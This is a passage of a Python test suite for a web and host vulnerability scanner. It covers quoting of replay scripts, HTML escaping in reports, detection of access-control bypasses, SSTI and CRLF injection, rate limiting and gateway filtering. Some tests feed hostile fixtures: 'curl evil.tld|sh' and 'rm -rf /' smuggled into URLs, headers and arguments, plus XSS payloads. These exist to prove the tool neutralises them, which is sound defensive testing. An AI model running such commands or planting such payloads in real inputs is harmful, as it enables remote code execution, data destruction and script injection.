        real = getattr(installer.os, "geteuid", None)
        try:
            if real is not None:
                del installer.os.geteuid
            self.assertTrue(installer._sudo_needed())
        finally:
            if real is not None:
                installer.os.geteuid = real

    def test_no_subprocess_uses_a_shell(self):
        """shell=True plus attacker-influenced argv is how tools get owned.

        Parsed rather than grepped: the string also appears in prose explaining
        why it is avoided, and a test that cannot tell code from a comment is
        not a test.
        """
        import ast
        import pathlib
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        offenders = []
        for f in sorted(root.rglob("*.py")):
            tree = ast.parse(f.read_text(encoding="utf-8"), filename=str(f))
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                for kw in node.keywords:
                    if kw.arg != "shell":
                        continue
                    if isinstance(kw.value, ast.Constant) and kw.value.value:
                        offenders.append("%s:%d" % (f.name, node.lineno))
        self.assertEqual(offenders, [])


class WiringTests(unittest.TestCase):
    """Guards against the failure mode where a feature exists but never runs.

    Each of these caught a real gap: content discovery was documented and
    installable but never invoked, and four tools were installed on every
    machine for nothing.
    """

    def test_every_module_stage_is_one_the_engine_runs(self):
        import inspect
        from assay import engine
        from assay.modules import STAGES, all_modules
        src = inspect.getsource(engine.Engine.run)
        executed = {s for s in STAGES if '_stage_modules("%s")' % s in src}
        # the probe stage is invoked from run() as well
        declared = {m.stage for m in all_modules()}
        orphans = sorted(declared - executed)
        self.assertEqual(orphans, [],
                         "modules registered at stages the engine never runs: %s"
                         % orphans)

    def test_every_registered_tool_is_actually_used(self):
        """A tool in the registry gets installed and advertised by doctor."""
        import pathlib
        from assay import tools
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        blob = "\n".join(f.read_text(encoding="utf-8")
                          for f in root.rglob("*.py") if f.name != "tools.py")
        toolsrc = (root / "tools.py").read_text(encoding="utf-8")
        unused = []
        for name, spec in tools.REGISTRY.items():
            if spec.binary == "__wordlist__":
                continue
            slug = name.replace("-", "_").replace(".", "")
            # used if a wrapper for it is called outside tools.py, or the binary
            # name appears in an argv list built anywhere
            wrapper_used = any(("%s_" % slug) in blob for _ in (0,)) and \
                any(w in blob for w in (slug + "_scan", slug + "_probe",
                                        slug + "_crawl", slug + "_urls",
                                        slug + "_params", slug + "_enum",
                                        slug + "_resolve", slug + "_discover"))
            argv_used = ('"%s"' % spec.binary) in blob
            helper_defined = ('"%s"' % spec.binary) in toolsrc
            if not (wrapper_used or argv_used or
                    (helper_defined and slug in blob)):
                unused.append(name)
        self.assertEqual(unused, [],
                         "registered but never invoked: %s" % unused)

    def test_profile_options_are_all_read(self):
        import pathlib
        from assay.config import PROFILES
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        blob = "\n".join(f.read_text(encoding="utf-8") for f in root.rglob("*.py"))
        unread = [k for k in PROFILES["standard"]
                  if 'opts.get("%s"' % k not in blob and 'opts["%s"]' % k not in blob]
        self.assertEqual(unread, [], "profile options never read: %s" % unread)

    def test_content_discovery_module_is_registered(self):
        from assay.modules import all_modules
        self.assertIn("content", [m.name for m in all_modules()])


class PacingTests(unittest.TestCase):
    def test_backoff_halves_and_recovers_to_the_ceiling(self):
        from assay.net import RateLimiter
        l = RateLimiter(20)
        self.assertEqual(l.back_off(), 10.0)
        self.assertEqual(l.back_off(), 5.0)
        for _ in range(20):
            l.recover()
        self.assertEqual(l.rate, 20)
        self.assertEqual(l.throttled, 2)

    def test_backoff_has_a_floor(self):
        from assay.net import RateLimiter
        l = RateLimiter(20)
        for _ in range(50):
            l.back_off()
        self.assertGreaterEqual(l.rate, 0.5)

    def test_per_host_limiter_is_separate_from_global(self):
        from assay.config import Config
        from assay.net import HttpClient
        c = HttpClient(Config(rate=100, rate_per_host=5))
        a, b = c._host_limiter("a.test"), c._host_limiter("b.test")
        self.assertIsNot(a, b)
        self.assertEqual(a.base_rate, 5)
        self.assertIs(a, c._host_limiter("a.test"))

    def test_per_host_limiting_can_be_disabled(self):
        from assay.config import Config
        from assay.net import HttpClient
        self.assertIsNone(HttpClient(Config(rate_per_host=0))._host_limiter("a.test"))


class ImpactClassTests(unittest.TestCase):
    def test_every_module_declares_a_valid_class(self):
        from assay.modules import IMPACT_CLASSES, all_modules
        bad = [(m.name, m.impact_class) for m in all_modules()
               if m.impact_class not in IMPACT_CLASSES]
        self.assertEqual(bad, [])

    def test_safe_mode_admits_only_retrieval_modules(self):
        from assay.config import Config
        from assay.context import Context
        from assay.modules import all_modules

        class _S:
            def add_finding(self, f): return True
        cfg = Config(safe_mode=True)
        ctx = Context(cfg=cfg, store=_S(), http=None, tune={})
        allowed = [m.name for m in all_modules() if m.applicable(ctx)]
        classes = {m.impact_class for m in all_modules() if m.name in allowed}
        self.assertTrue(classes <= {"passive", "read"},
                        "safe mode admitted a probing module: %s" % classes)
        self.assertIn("exposure", allowed)
        self.assertNotIn("sqli", allowed)
        self.assertNotIn("content", allowed)

    def test_normal_mode_admits_probing_modules(self):
        from assay.config import Config
        from assay.context import Context
        from assay.modules import all_modules

        class _S:
            def add_finding(self, f): return True
        ctx = Context(cfg=Config(), store=_S(), http=None, tune={})
        allowed = [m.name for m in all_modules() if m.applicable(ctx)]
        self.assertIn("sqli", allowed)


class JournalTests(unittest.TestCase):
    def test_requests_and_commands_become_replayable(self):
        import tempfile, os
        from assay.journal import Journal
        d = tempfile.mkdtemp()
        j = Journal(d)
        j.open(["target.test"], "standard")
        j.request("GET", "https://target.test/.env", {"X-Api-Key": "abc"})
        j.command(["nmap", "-sV", "10.0.0.1"])
        j.close()
        log = open(j.log_path).read()
        replay = open(j.replay_path).read()
        self.assertIn("https://target.test/.env", log)
        self.assertIn("nmap -sV 10.0.0.1", log)
        self.assertIn("curl -sSik", replay)
        self.assertIn("nmap -sV 10.0.0.1", replay)
        self.assertTrue(os.access(j.replay_path, os.X_OK))

    def test_identical_requests_are_recorded_once_in_replay(self):
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "quick")
        for _ in range(5):
            j.request("GET", "https://t/x", {})
        j.close()
        self.assertEqual(open(j.replay_path).read().count("https://t/x"), 1)
        self.assertEqual(j.requests, 5)

    def test_disabled_journal_writes_nothing(self):
        import tempfile, os
        from assay.journal import Journal
        d = tempfile.mkdtemp()
        j = Journal(d, enabled=False)
        j.open(["t"], "quick"); j.request("GET", "https://t/", {}); j.close()
        self.assertFalse(os.path.exists(j.log_path))


class RunDirTests(unittest.TestCase):
    def test_codename_wins_over_target_derived_name(self):
        from assay.config import Config
        c = Config(targets=["10.20.0.0/24", "a.test"], codename="ZESTY WOMBAT")
        self.assertTrue(c.apply_run_dir("/out").endswith("ZESTY-WOMBAT"))

    def test_targets_name_the_folder_without_a_codename(self):
        from assay.config import Config
        self.assertTrue(
            Config(targets=["https://app.example.com"]).apply_run_dir("/out")
            .endswith("app.example.com"))

    def test_multiple_targets_get_a_stable_disambiguated_name(self):
        from assay.config import Config
        a = Config(targets=["a.test", "b.test"]).apply_run_dir("/out")
        b = Config(targets=["b.test", "a.test"]).apply_run_dir("/out")
        self.assertEqual(a, b, "name must not depend on argument order")

    def test_flat_mode_writes_into_the_root(self):
        from assay.config import Config
        self.assertEqual(
            Config(targets=["a.test"]).apply_run_dir("/out", flat=True), "/out")


class DiffTests(unittest.TestCase):
    def _store(self):
        import tempfile, os
        from assay.store import Store
        return os.path.join(tempfile.mkdtemp(), "assay.db")

    def _add(self, s, title, target="https://a/x"):
        from assay.models import Evidence, Finding
        s.add_finding(Finding(title=title, target=target, severity="high",
                              confidence="confirmed", module="m", impact="i",
                              evidence=[Evidence(kind="http", output="x")]))

    def test_second_run_reports_only_the_delta(self):
        from assay.store import Store
        path = self._store()
        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "A"); self._add(s, "B")
        s.save_web("https://a/", "a", 443, 200, "", "", [], {})
        s.finish_run(); s.close()

        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "A"); self._add(s, "C")
        s.save_web("https://b/", "b", 443, 200, "", "", [], {})
        d = s.diff()
        self.assertFalse(d["is_first_run"])
        self.assertEqual([f.title for f in d["new_findings"]], ["C"])
        self.assertEqual([f.title for f in d["gone_findings"]], ["B"])
        self.assertEqual(d["new_web"], ["https://b/"])
        s.close()

    def test_first_run_is_flagged_rather_than_diffed(self):
        from assay.store import Store
        s = Store(self._store()); s.start_run("standard", ["t"])
        self._add(s, "A")
        d = s.diff()
        self.assertTrue(d["is_first_run"])
        self.assertIsNone(d["previous"])
        s.close()

    def test_repeat_finding_is_not_reported_as_new(self):
        from assay.store import Store
        path = self._store()
        s = Store(path); s.start_run("standard", ["t"]); self._add(s, "A")
        fid = list(s.iter_findings())[0].fingerprint()
        s.finish_run(); s.close()
        s = Store(path); s.start_run("standard", ["t"]); self._add(s, "A")
        self.assertFalse(s.is_new_this_run(fid))
        self.assertEqual(s.diff()["new_findings"], [])
        s.close()


class SchemaMigrationTests(unittest.TestCase):
    """Upgrading must not destroy an existing engagement's history.

    CREATE TABLE IF NOT EXISTS leaves an existing table alone, so every column
    added after the first release has to be migrated in. Without this the first
    scan after a git pull crashes, and takes the run history that `assay diff`
    depends on with it.
    """

    LEGACY = """
    CREATE TABLE runs (id INTEGER PRIMARY KEY AUTOINCREMENT, started REAL,
      finished REAL, profile TEXT, targets TEXT, args TEXT);
    CREATE TABLE findings (fid TEXT PRIMARY KEY, run_id INTEGER, title TEXT,
      target TEXT, severity TEXT, confidence TEXT, category TEXT, cwe TEXT,
      module TEXT, impact TEXT, detail TEXT, repro TEXT, refs TEXT, tags TEXT,
      evidence TEXT, score REAL, triage TEXT, created REAL,
      status TEXT DEFAULT 'new', notes TEXT);
    CREATE TABLE hosts (host TEXT PRIMARY KEY, ip TEXT, data TEXT, updated REAL);
    CREATE TABLE web (url TEXT PRIMARY KEY, host TEXT, port INTEGER,
      status INTEGER, title TEXT, server TEXT, tech TEXT, data TEXT,
      updated REAL);
    """

    def _legacy_db(self):
        import os, sqlite3, tempfile
        path = os.path.join(tempfile.mkdtemp(), "assay.db")
        c = sqlite3.connect(path)
        c.executescript(self.LEGACY)
        c.execute("INSERT INTO runs (started, profile, targets)"
                  " VALUES (1,'standard','[]')")
        c.execute("INSERT INTO findings (fid,run_id,title,target,severity,"
                  "confidence,score,triage,created,refs,tags,evidence) VALUES"
                  " ('old',1,'Legacy finding','https://a/','high','firm',50,"
                  "'LOOK',1,'[]','[]','[]')")
        c.execute("INSERT INTO web VALUES"
                  " ('https://a/','a',443,200,'','','[]','{}',1)")
        c.commit(); c.close()
        return path

    def _add(self, s, title):
        from assay.models import Evidence, Finding
        s.add_finding(Finding(title=title, target="https://a/x", severity="high",
                              confidence="confirmed", module="m", impact="i",
                              evidence=[Evidence(kind="http", output="x")]))

    def test_writing_to_a_legacy_database_succeeds(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        self._add(s, "New finding")
        s.save_web("https://b/", "b", 443, 200, "", "", [], {})
        s.close()

    def test_legacy_rows_survive_the_upgrade(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        titles = [f.title for f in s.iter_findings()]
        self.assertIn("Legacy finding", titles)
        s.close()

    def test_pre_existing_findings_are_not_reported_as_new(self):
        from assay.store import Store
        s = Store(self._legacy_db())
        s.start_run("standard", ["t"])
        self._add(s, "New finding")
        d = s.diff()
        self.assertEqual([f.title for f in d["new_findings"]], ["New finding"])
        s.close()

    def test_migration_is_idempotent(self):
        from assay.store import Store
        path = self._legacy_db()
        for _ in range(3):
            s = Store(path); s.start_run("standard", ["t"]); s.close()

    def test_database_is_self_contained_after_close(self):
        """A copy of the .db alone must carry the findings."""
        import os, shutil, sqlite3, tempfile
        from assay.store import Store
        path = self._legacy_db()
        s = Store(path); s.start_run("standard", ["t"])
        self._add(s, "Persisted"); s.finish_run(); s.close()
        copy = os.path.join(tempfile.mkdtemp(), "copy.db")
        shutil.copy(path, copy)
        n = sqlite3.connect(copy).execute(
            "SELECT COUNT(*) FROM findings WHERE title='Persisted'").fetchone()[0]
        self.assertEqual(n, 1)


class AccountingTests(unittest.TestCase):
    def test_failed_requests_are_counted_not_dropped(self):
        """A summary that only counts successes under-reports the traffic sent."""
        from assay.config import Config, Scope
        from assay.net import HttpClient
        c = HttpClient(Config(scope=Scope(allow=["192.0.2.0/24"]),
                              timeout=0.6, retries=0))
        c.get("https://192.0.2.7/")
        self.assertEqual(c.attempts, 1)
        self.assertEqual(c.failures, 1)
        self.assertEqual(c.count, 0)

    def test_out_of_scope_requests_are_not_counted_as_attempts(self):
        from assay.config import Config, Scope
        from assay.net import HttpClient
        c = HttpClient(Config(scope=Scope(allow=["target.tld"])))
        c.get("https://evil.tld/")
        self.assertEqual(c.attempts, 0, "nothing was sent, so nothing was attempted")


class ReportRenderTests(unittest.TestCase):
    """The report was crashing for a whole release because nothing rendered one.

    A format-string argument was added without its placeholder, so every field
    after it shifted. Structural checks on a pre-generated file cannot catch
    that - only actually building a report can.
    """

    HOSTILE = '</script><img src=x onerror=alert(1)>'
    ATTR_BREAK = '" onmouseover="alert(2)'

    def _store(self, **kw):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        s.add_finding(Finding(
            title=kw.get("title", "Exposed .env file"),
            target=kw.get("target", "https://a.test/.env"),
            severity="critical", confidence="confirmed", module="exposure",
            category="A05 Security Misconfiguration", cwe="CWE-540",
            impact=kw.get("impact", "Live credentials in cleartext."),
            detail=kw.get("detail", "matched DB_PASSWORD="),
            repro=kw.get("repro", "curl -sSk https://a.test/.env"),
            tags=["exposure", "verified"],
            evidence=[Evidence(kind="http", label="proof",
                               output=kw.get("evidence", "DB_PASSWORD=x"))]))
        return s

    def _build(self, store, **kw):
        import os, tempfile
        from assay import report
        out = os.path.join(tempfile.mkdtemp(), "r.html")
        return open(report.build(store, {"hosts": 1, "web": 1, "requests": 5,
                                         "duration": 2.0}, out, **kw)).read()

    def test_report_builds_at_all(self):
        html = self._build(self._store())
        self.assertIn("Exposed .env file", html)
        self.assertIn("</html>", html)

    def test_report_builds_with_no_findings(self):
        import os, tempfile
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        self.assertIn("</html>", self._build(s))

    def test_live_and_final_variants_both_build(self):
        s = self._store()
        # 'livebar' also appears in the stylesheet, so match the element.
        self.assertIn('id="livebar"', self._build(s, live=True))
        self.assertNotIn('id="livebar"', self._build(s, live=False))

    def test_report_with_ai_and_chains_builds(self):
        s = self._store()
        fid = list(s.iter_findings())[0].fingerprint()
        s.save_ai({"triage": [{"id": fid, "verdict": "report", "priority": 1,
                               "false_positive_risk": "low", "rationale": "r",
                               "impact_statement": "i", "next_steps": ["do x"],
                               "commands": ["curl https://a.test/"]}],
                   "chains": [{"name": "c", "combined_severity": "critical",
                               "finding_ids": [fid], "combined_impact": "x",
                               "steps": ["s1"]}]})
        html = self._build(s, ai={"summary": "s", "_model": "m"})
        self.assertIn("Attack chains", html)
        self.assertIn("AI triage", html)

    def test_hostile_content_cannot_break_out_of_the_page(self):
        """Titles, evidence and URLs all come from the target."""
        import re
        s = self._store(title="T " + self.HOSTILE, impact="I " + self.ATTR_BREAK,
                        detail=self.HOSTILE, evidence=self.HOSTILE,
                        target="https://a.test/" + self.HOSTILE)
        html = self._build(s)
        self.assertNotIn("</script><img", html)
        self.assertNotIn('" onmouseover="alert', html)
        self.assertFalse(re.search(r"<img\s[^>]*onerror", html),
                         "payload parsed as markup")
        for m in re.finditer(r"<script[^>]*>(.*?)</script>", html, re.S):
            self.assertNotIn("alert(", m.group(1),
                             "hostile content reached a script block")

    def test_zero_counts_render_as_zero_not_blank(self):
        """`str(x or "")` silently blanks a zero, which reads as missing data."""
        import re
        html = self._build(self._store())
        tiles = re.findall(r'<div class="num"[^>]*>([^<]*)</div>', html)
        self.assertTrue(tiles, "no tiles rendered")
        self.assertNotIn("", tiles, "a tile rendered blank instead of a number")

    def test_every_severity_and_triage_renders(self):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        for sev in ("critical", "high", "medium", "low", "info"):
            s.add_finding(Finding(title="F " + sev, target="https://a/", severity=sev,
                                  confidence="firm", module="m", impact="i",
                                  evidence=[Evidence(kind="http", output="x")]))
        html = self._build(s)
        for sev in ("critical", "high", "medium", "low", "info"):
            self.assertIn("F " + sev, html)


class RegexBudgetTests(unittest.TestCase):
    """Patterns run against response bodies the target controls."""

    ADVERSARIAL = [
        "A" * 40000, ("a" * 500 + "!") * 40, "<" * 20000,
        "https://" + "a." * 2000 + "!", "'" * 5000, "x=" * 10000,
        "/" + "a/" * 5000, '"' + "b" * 20000, "0123456789" * 4000,
        '<script src="' + "a" * 3000,
    ]

    def _all_patterns(self):
        from assay import domains, redact, urls
        from assay.modules import secrets, web_exposure, web_sqli
        pats = []
        for mod, names in ((urls, "JS_PATH_RE JS_URL_RE JS_CALL_RE ASSET_RE JS_NOISE_RE"),
                           (domains, "CSP_HOST_RE"),
                           (secrets, "INTERNAL_HOST_RE SCRIPT_RE SOURCEMAP_RE")):
            for n in names.split():
                pats.append((n, getattr(mod, n)))
        pats += [(e, r) for e, r in web_sqli.DB_ERRORS]
        pats += [(l, r) for l, _s, r, _w in secrets.SECRET_PATTERNS]
        pats += [(k, r) for k, r in redact.DETECTORS + redact.NETWORK_DETECTORS]
        pats += [(sig["path"], sig["_re"]) for sig in web_exposure.load_signatures()]
        return pats

    def test_no_pattern_backtracks_catastrophically(self):
        import time
        slow = []
        for name, rx in self._all_patterns():
            for body in self.ADVERSARIAL:
                t0 = time.time()
                rx.search(body)
                dt = time.time() - t0
                if dt > 0.25:
                    slow.append((name, round(dt, 2)))
        self.assertEqual(slow, [], "catastrophic backtracking: %s" % slow)


class ConcurrencyTests(unittest.TestCase):
    def test_url_pool_respects_the_cap_under_contention(self):
        import threading
        from assay.config import Config
        from assay.context import Context

        class _S:
            def add_finding(self, f): return True
        ctx = Context(cfg=Config(), store=_S(), http=None, tune={})
        threads = [threading.Thread(
            target=lambda n=i: ctx.add_urls(
                "https://a", ["https://a/%d" % k for k in range(n, n + 40)], 50))
            for i in range(0, 80, 5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        bucket = ctx.urls["https://a"]
        self.assertLessEqual(len(bucket), 50)
        self.assertEqual(len(bucket), len(set(bucket)), "duplicates leaked in")


class ReplaySafetyTests(unittest.TestCase):
    def test_target_controlled_values_cannot_inject_into_replay(self):
        """replay.sh is executable; URLs and headers come from the target."""
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "standard")
        j.request("GET", "https://a.test/x';curl evil.tld|sh;#",
                  {"X-H": "v'; curl evil.tld | sh; #"})
        j.command(["nmap", "-sV", "10.0.0.1; rm -rf /"])
        j.close()
        replay = open(j.replay_path).read()
        for line in replay.splitlines():
            if line.startswith("#") or not line.strip():
                continue
            # Every metacharacter must sit inside a quoted string.
            import shlex
            tokens = shlex.split(line)
            self.assertNotIn("sh", [t.strip() for t in tokens[1:] if t == "sh"],
                             "a bare 'sh' token means the quoting failed")
        self.assertIn("'10.0.0.1; rm -rf /'", replay)


class BypassTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def _ctx_with(self, allow):
        """allow(path, headers, method) -> True when the guard is bypassed."""
        def route(m, url, h, b):
            path = urlsplit(url).path
            if not path.startswith("/admin"):
                return None
            if allow(path, h, m):
                return 200, {"Content-Type": "text/html"}, \
                    "<html><h1>Admin console</h1>" + ("panel " * 80) + "</html>"
            return 403, {"Content-Type": "text/html"}, \
                "<html><h1>Forbidden</h1></html>"
        return make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/admin"]})

    def test_path_trick_bypass_is_found(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(lambda p, h, m: p != "/admin")
        found = ForbiddenBypassModule().run_web(ctx, web_target())
        self.assertTrue(found, "a path-mutation bypass was missed")
        self.assertEqual(found[0].severity, "high")
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertEqual(len(found[0].evidence), 2, "denial and bypass both needed")

    def test_header_trick_bypass_is_found(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(
            lambda p, h, m: h.get("X-Forwarded-For") == "127.0.0.1")
        found = ForbiddenBypassModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertIn("header", found[0].title)

    def test_consistently_forbidden_path_reports_nothing(self):
        from assay.modules.web_bypass import ForbiddenBypassModule
        ctx, _ = self._ctx_with(lambda p, h, m: False)
        self.assertEqual(ForbiddenBypassModule().run_web(ctx, web_target()), [])

    def test_login_page_returned_with_200_is_not_a_bypass(self):
        """Plenty of guards answer 200 with a sign-in page."""
        from assay.modules.web_bypass import ForbiddenBypassModule

        def route(m, url, h, b):
            if not urlsplit(url).path.startswith("/admin"):
                return None
            if urlsplit(url).path == "/admin":
                return 403, {"Content-Type": "text/html"}, "<h1>Forbidden</h1>"
            return 200, {"Content-Type": "text/html"}, \
                "<html><title>Sign in</title><form>" + ("x " * 90) + "</form></html>"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/admin"]})
        self.assertEqual(ForbiddenBypassModule().run_web(ctx, web_target()), [])


class SstiTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_evaluated_arithmetic_is_reported(self):
        from assay.modules.web_inject import SstiModule
        import re as _re

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("q", [""])[0]
            # A real Jinja-style engine: evaluate {{a*b}}.
            out = _re.sub(r"\{\{(\d+)\*(\d+)\}\}",
                          lambda mm: str(int(mm.group(1)) * int(mm.group(2))), v)
            return 200, {"Content-Type": "text/html"}, "<p>%s</p>" % out
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        found = SstiModule().run_web(ctx, web_target())
        self.assertTrue(found, "evaluated template expression was missed")
        self.assertEqual(found[0].severity, "critical")

    def test_echoed_payload_is_not_ssti(self):
        """Reflection without evaluation is not template injection."""
        from assay.modules.web_inject import SstiModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("q", [""])[0]
            return 200, {"Content-Type": "text/html"}, "<p>%s</p>" % v
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(SstiModule().run_web(ctx, web_target()), [])

    def test_page_containing_the_number_by_chance_is_not_ssti(self):
        from assay.modules.web_inject import SstiModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, "<p>total 5131 items</p>"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(SstiModule().run_web(ctx, web_target()), [])


class CrlfTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_injected_header_is_reported(self):
        from assay.modules.web_inject import CrlfModule
        from urllib.parse import unquote

        def route(m, url, h, b):
            v = unquote(parse_qs(urlsplit(url).query).get("url", [""])[0])
            hdrs = {"Content-Type": "text/html"}
            if "\r\n" in v or "\n" in v:
                for line in v.replace("\r\n", "\n").split("\n")[1:]:
                    if ":" in line:
                        k, _, val = line.partition(":")
                        hdrs[k.strip()] = val.strip()
            return 200, hdrs, "ok"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/r?url=x"]})
        found = CrlfModule().run_web(ctx, web_target())
        self.assertTrue(found, "header injection was missed")
        self.assertEqual(found[0].confidence, "confirmed")

    def test_sanitised_input_reports_nothing(self):
        from assay.modules.web_inject import CrlfModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, "ok"
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/r?url=x"]})
        self.assertEqual(CrlfModule().run_web(ctx, web_target()), [])


class GatewayTests(unittest.TestCase):
    """Where all 80/443 traffic is proxied, every address answers."""

    PROXY = "<html><head><title>Gateway</title></head><body>No route.</body></html>"

    def _wt(self, host, body, **kw):
        from assay.models import WebTarget
        w = WebTarget(url="https://%s/" % host, host=host, port=443,
                      scheme="https", status=kw.get("status", 200),
                      server=kw.get("server", "nginx"), title=kw.get("title", ""),
                      content_type="text/html")
        w.body_sample = body
        return w

    def test_uniform_proxy_response_is_detected_and_filtered(self):
        from assay import gateway
        web = [self._wt("10.20.0.%d" % i, self.PROXY) for i in range(1, 41)]
        web.append(self._wt("10.20.0.90",
                            "<html>" + "Real application " * 40 + "</html>",
                            title="Portal"))
        v = gateway.detect(web)
        self.assertTrue(v.detected)
        self.assertEqual([w.host for w in gateway.filter_web(web, v)],
                         ["10.20.0.90"])

    def test_a_real_load_balanced_pool_is_not_filtered(self):
        from assay import gateway
        pool = [self._wt("10.20.1.%d" % i, "<html>" + "Real app " * 50 + "</html>",
                         title="App") for i in range(1, 7)]
        pool += [self._wt("10.20.1.%d" % i, "<html>different %d</html>" % i,
                          title="Other %d" % i) for i in range(20, 40)]
        self.assertFalse(gateway.detect(pool).detected)

    def test_asserted_mode_is_more_sensitive_but_not_reckless(self):
        """Asserted lowers the bar; it does not remove it.

        Two matching hosts must never be enough, or a two-node load-balanced
        pool gets filtered away as though it were the gateway.
        """
        from assay import gateway
        two = [self._wt("10.0.0.1", self.PROXY), self._wt("10.0.0.2", self.PROXY),
               self._wt("10.0.0.3", "<html>" + "Real " * 60 + "</html>",
                        title="App")]
        self.assertFalse(gateway.detect(two, asserted=True).detected,
                         "2 matching hosts is not enough evidence")

        three = two + [self._wt("10.0.0.4", self.PROXY)]
        v = gateway.detect(three, asserted=True)
        self.assertTrue(v.detected, "3 of 4 should conclude in asserted mode")
        self.assertEqual([w.host for w in gateway.filter_web(three, v)],
                         ["10.0.0.3"])

    def test_proxied_ports_are_not_reported_as_exposed_services(self):
        from assay.config import Config
        from assay.context import Context
        from assay.models import Port, Target
        from assay.modules.host_services import ServiceTriageModule

        class _S:
            def add_finding(self, f): return True
        cfg = Config(proxied_ports=[80, 443])
        ctx = Context(cfg=cfg, store=_S(), http=None, tune={})
        t = Target(raw="10.0.0.1", host="10.0.0.1", ip="10.0.0.1")
        t.ports = [Port(port=443, service="https"), Port(port=21, service="ftp")]
        titles = [f.title for f in ServiceTriageModule().run_host(ctx, t)]
        self.assertFalse(any("443" in x for x in titles),
                         "a proxied port was reported as a service")
        self.assertTrue(any("ftp" in x for x in titles),
                        "a real service must still be reported")

    def test_too_few_hosts_to_conclude(self):
        from assay import gateway
        self.assertFalse(gateway.detect(
            [self._wt(h, self.PROXY) for h in ("a.tld", "b.tld", "c.tld")]).detected)

    def test_several_ports_on_one_host_are_not_evidence(self):
        from assay import gateway
        from assay.models import WebTarget
        web = []
        for port in (80, 443, 8080, 8443, 9000, 9443):
            w = WebTarget(url="https://a.tld:%d/" % port, host="a.tld", port=port,
                          scheme="https", status=200, content_type="text/html")
            w.body_sample = self.PROXY
            web.append(w)
        self.assertFalse(gateway.detect(web).detected)


class TriageStatusTests(unittest.TestCase):
    def _store(self):
        import os, tempfile
        from assay.models import Evidence, Finding
        from assay.store import Store
        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
        s.start_run("standard", ["t"])
        for t in ("Exposed .env", "CORS reflect", "Open redirect"):
            s.add_finding(Finding(title=t, target="https://a/" + t[:3],
                                  severity="high", confidence="firm", module="m",
                                  impact="i",
                                  evidence=[Evidence(kind="http", output="x")]))
        return s

    def test_status_persists_and_mutes(self):
        s = self._store()
        fid = s.findings()[0].fingerprint()
        s.set_status(fid, "reported", notes="submitted")
        self.assertEqual(s.status_of(fid), "reported")
        self.assertEqual(len(s.findings()), 3)
        self.assertEqual(len(s.findings(include_muted=False)), 2)

    def test_muted_findings_do_not_resurface_in_diff(self):
        s = self._store()
        fid = s.findings()[0].fingerprint()
        title = s.findings()[0].title
        s.set_status(fid, "duplicate")
        self.assertNotIn(title, [f.title for f in s.diff()["new_findings"]])

    def test_in_progress_is_not_muted(self):
        """Marking something as being worked must not hide it."""
        s = self._store()
        fid = s.findings()[0].fingerprint()
        s.set_status(fid, "in-progress")
        self.assertEqual(len(s.findings(include_muted=False)), 3)


class LivenessTests(unittest.TestCase):
    """On a proxied network an open port and an HTTP response prove nothing.

    What still separates a real service from the gateway is the content.
    """

    def test_gateway_errors_are_not_a_service(self):
        from assay.gateway import looks_live
        for status in (502, 503, 504):
            live, why = looks_live(status, "<html>Service Unavailable</html>",
                                   proxied_port=True)
            self.assertFalse(live, "HTTP %d treated as a live service" % status)
            self.assertIn("backend", why)

    def test_empty_body_is_not_a_service(self):
        from assay.gateway import looks_live
        for body in ("", "   ", "\n\n  \t"):
            self.assertFalse(looks_live(200, body, proxied_port=True)[0])

    def test_real_content_is_a_service(self):
        from assay.gateway import looks_live
        live, _ = looks_live(200, "<html><body>Real application</body></html>",
                             proxied_port=True)
        self.assertTrue(live)

    def test_a_guarded_endpoint_is_still_a_service(self):
        """401/403 means something is there and is protecting itself."""
        from assay.gateway import looks_live
        self.assertTrue(looks_live(401, "<html>Authentication required</html>",
                                   proxied_port=True)[0])
        self.assertTrue(looks_live(403, "<html>Forbidden</html>",
                                   proxied_port=True)[0])

    def test_no_response_is_not_a_service(self):
        from assay.gateway import looks_live
        self.assertFalse(looks_live(0, "", proxied_port=False)[0])


class NonStandardPortTests(unittest.TestCase):
    def test_web_on_an_unrecognised_port_is_probed(self):
        """A site on 7777 with no service banner used to be invisible."""
        from assay.engine import NON_HTTP_SERVICES
